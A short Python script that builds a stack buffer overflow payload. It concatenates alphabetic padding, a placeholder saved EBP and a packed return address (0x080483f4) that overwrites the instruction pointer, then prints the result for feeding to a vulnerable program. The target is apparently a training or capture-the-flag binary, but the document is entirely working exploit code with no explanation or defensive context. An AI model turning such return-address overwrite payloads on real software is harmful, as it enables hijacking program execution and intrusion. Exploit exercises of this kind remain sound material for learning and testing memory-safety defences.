import struct

buffer = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR'
ebp = 'SSSS'
eip = struct.pack("I",0x080483f4)

payload = buffer + ebp + eip
print(payload)